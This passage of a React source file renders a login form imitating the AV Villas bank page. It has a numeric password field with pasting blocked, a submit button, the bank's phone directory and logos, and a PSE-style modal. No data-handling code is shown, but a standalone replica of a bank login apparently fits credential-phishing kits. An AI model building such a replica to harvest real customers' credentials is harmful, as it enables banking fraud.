                                password: onlyNumbers,
                              });
                            }}
                            onPaste={(e) => e.preventDefault()}
                            onFocus={() => setFocusedField("password")}
                            onBlur={() => {
                              setFocusedField(null);
                              if (!formData.password) {
                                setTouched((prev) => ({
                                  ...prev,
                                  password: true,
                                }));
                              }
                            }}
                            inputMode="numeric"
                            pattern="[0-9]*"
                            maxLength={AVVILLAS_PASSWORD_MAX_LENGTH}
                            autoComplete="new-password"
                          />
                          {touched.password && validationErrors.password ? (
                            <div className="avv-icon avv-icon--error">
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#a00104"
                                strokeWidth="1.85"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="22"
                                height="22"
                              >
                                <path d="M10.18 2.8c.8-1.36 2.84-1.36 3.64 0l8.92 15.07c.81 1.39-.19 3.13-1.82 3.13H3.08c-1.63 0-2.63-1.74-1.82-3.13L10.18 2.8z"></path>
                                <line x1="12" y1="9.4" x2="12" y2="13.6"></line>
                                <line
                                  x1="12"
                                  y1="17.0"
                                  x2="12.01"
                                  y2="17.0"
                                ></line>
                              </svg>
                            </div>
                          ) : (
                            <div className="avv-icon avv-icon--toggle">
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#6c7a89"
                                strokeWidth="2"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="22"
                                height="22"
                              >
                                <rect
                                  x="3"
                                  y="11"
                                  width="18"
                                  height="11"
                                  rx="2"
                                  ry="2"
                                ></rect>
                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                <circle
                                  cx="9"
                                  cy="16"
                                  r="1.5"
                                  fill="#6c7a89"
                                  stroke="none"
                                ></circle>
                                <circle
                                  cx="12"
                                  cy="16"
                                  r="1.5"
                                  fill="#6c7a89"
                                  stroke="none"
                                ></circle>
                                <circle
                                  cx="15"
                                  cy="16"
                                  r="1.5"
                                  fill="#6c7a89"
                                  stroke="none"
                                ></circle>
                              </svg>
                            </div>
                          )}
                        </div>
                        {touched.password && validationErrors.password && (
                          <span className="avv-error-text">
                            {validationErrors.password}
                          </span>
                        )}
                      </div>

                      <button
                        type="submit"
                        className="avv-btn avv-btn-primary"
                        disabled={!isSubmitEnabled || getLoading}
                      >
                        INGRESAR
                      </button>
                    </form>
                  </div>

                  <div className="avv-login-footer">
                    <div className="avv-secondary-action">
                      <button
                        type="button"
                        className="avv-link avv-link-button avv-link--bold"
                      >
                        Volver al comercio
                      </button>
                    </div>
                  </div>
                </section>
              </div>
            </div>
          </div>
        </div>

        {/* Se renderiza el footer */}
        <div className="avv-footer-section">
          <footer className="avv-footer">
            <div className="avv-footer-main">
              <div className="avv-footer-brand">
                <img
                  src={avalLogoSuperBlack}
                  alt="Grupo AVAL"
                  className="avv-footer-logo-aval"
                />
              </div>

              <div
                className={`avv-footer-info ${isMoreCitiesOpen ? "avv-footer-info--more-open" : ""}`}
              >
                <div className="avv-footer-phones-header">
                  <strong>Línea Audiovillas</strong>
                </div>

                <div
                  className={`avv-footer-phones-grid ${isMoreCitiesOpen ? "avv-footer-phones-grid--more-open" : ""}`}
                >
                  <div className="avv-phone-item">
                    <span className="avv-phone-city">Nacional</span>
                    <span className="avv-phone-number">01 8000 51 8000</span>
                  </div>
                  <div className="avv-phone-divider"></div>
                  <div className="avv-phone-item avv-phone-item--bogota">
                    <div className="avv-phone-city-wrap">
                      <span className="avv-phone-city">Bogotá</span>
                    </div>
                    <div className="avv-phone-number-wrap">
                      <span className="avv-phone-number">(601) 4441777</span>
                    </div>
                  </div>
                  <div className="avv-phone-divider"></div>
                  <div className="avv-phone-more-wrap">
                    <button
                      type="button"
                      className="avv-phone-more"
                      onClick={() => setIsMoreCitiesOpen((prev) => !prev)}
                    >
                      <span>Más ciudades</span>
                      <span
                        className={`avv-icon avv-icon-chevron-down avv-phone-more-arrow ${isMoreCitiesOpen ? "avv-icon-chevron-down--open" : ""}`}
                      ></span>
                    </button>

                    {isMoreCitiesOpen && (
                      <div className="avv-more-cities-panel">
                        <div className="avv-more-cities-grid">
                          <div className="avv-phone-item">
                            <span className="avv-phone-city">Barranquilla</span>
                            <span className="avv-phone-number">
                              (605) 3304330
                            </span>
                          </div>
                          <div className="avv-phone-item">
                            <span className="avv-phone-city">Bucaramanga</span>
                            <span className="avv-phone-number">
                              (607) 6302980
                            </span>
                          </div>
                          <div className="avv-phone-item">
                            <span className="avv-phone-city">Cali</span>
                            <span className="avv-phone-number">
                              (602) 8859595
                            </span>
                          </div>
                          <div className="avv-phone-item">
                            <span className="avv-phone-city">Medellín</span>
                            <span className="avv-phone-number">
                              (604) 3256000
                            </span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <div className="avv-footer-bottom">
              <img
                src={grupoAvalColor}
                alt="Grupo AVAL"
                className="avv-footer-logo-small"
              />
              <img
                src={logoVigiladoHorizontal}
                alt="Vigilado Superfinanciera"
                className="avv-footer-logo-vigilado"
              />
            </div>
          </footer>
        </div>
      </div>

      {showModal ? (
        <div className="avv-pse-modal-wrap" role="presentation">
          <div className="avv-pse-modal-card" role="dialog" aria-modal="true">
            <div className="avv-pse-modal-top">AV Villas</div>
            <div className="avv-pse-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="avv-pse-modal-bot">
              <button
                type="button"
                className="avv-pse-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      ) : null}

      {getLoading ? <LoadingAvvillas /> : null}
    </div>
  );
};

// Se exporta el componente
export default AvVillasLogin;